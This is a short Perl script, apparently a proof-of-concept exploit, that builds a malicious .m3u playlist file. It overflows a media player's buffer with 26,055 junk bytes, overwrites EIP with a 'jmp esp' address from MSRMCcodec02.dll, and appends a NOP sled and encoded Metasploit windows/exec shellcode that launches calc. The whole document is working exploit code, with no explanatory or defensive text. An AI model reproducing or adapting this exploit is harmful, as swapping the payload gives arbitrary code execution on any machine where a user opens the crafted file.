my $file= "crash7.m3u";
my $junk= "A" x 26055;
# jmp esp from MSRMCcodec02.dll
my $eip = pack('V',0x01B1B22A);  

my $shellcode = "\x90" x 25; 

# Encoder: x86/shikata_ga_nai
# Payload: windows/exec
# Payload size: 216 bytes
# EXITFUNC=seh, CMD=calc
# The payload
$shellcode = $shellcode."\xdb\xcf\xba\x26\x71\x61\x13\xd9\x74\x24\xf4\x5d\x29\xc9" .
"\xb1\x30\x83\xc5\x04\x31\x55\x14\x03\x55\x32\x93\x94\xef" .
"\xd2\xd1\x57\x10\x22\xb6\xde\xf5\x13\xf6\x85\x7e\x03\xc6" .
"\xce\xd3\xaf\xad\x83\xc7\x24\xc3\x0b\xe7\x8d\x6e\x6a\xc6" .
"\x0e\xc2\x4e\x49\x8c\x19\x83\xa9\xad\xd1\xd6\xa8\xea\x0c" .
"\x1a\xf8\xa3\x5b\x89\xed\xc0\x16\x12\x85\x9a\xb7\x12\x7a" .
"\x6a\xb9\x33\x2d\xe1\xe0\x93\xcf\x26\x99\x9d\xd7\x2b\xa4" .
"\x54\x63\x9f\x52\x67\xa5\xee\x9b\xc4\x88\xdf\x69\x14\xcc" .
"\xe7\x91\x63\x24\x14\x2f\x74\xf3\x67\xeb\xf1\xe0\xcf\x78" .
"\xa1\xcc\xee\xad\x34\x86\xfc\x1a\x32\xc0\xe0\x9d\x97\x7a" .
"\x1c\x15\x16\xad\x95\x6d\x3d\x69\xfe\x36\x5c\x28\x5a\x98" .
"\x61\x2a\x05\x45\xc4\x20\xab\x92\x75\x6b\xa1\x65\x0b\x11" .
"\x87\x66\x13\x1a\xb7\x0e\x22\x91\x58\x48\xbb\x70\x1d\xa8" .
"\x4a\x49\x8b\x3d\xf5\x38\xf6\x23\x06\x97\x34\x5a\x85\x12" .
"\xc4\x99\x95\x56\xc1\xe6\x11\x8a\xbb\x77\xf4\xac\x68\x77" .
"\xdd\xce\xef\xeb\xbd\x10";

open($FILE,">$file");
print $FILE $junk.$eip.$shellcode;
close($FILE);
print "m3u File Created successfully\n";

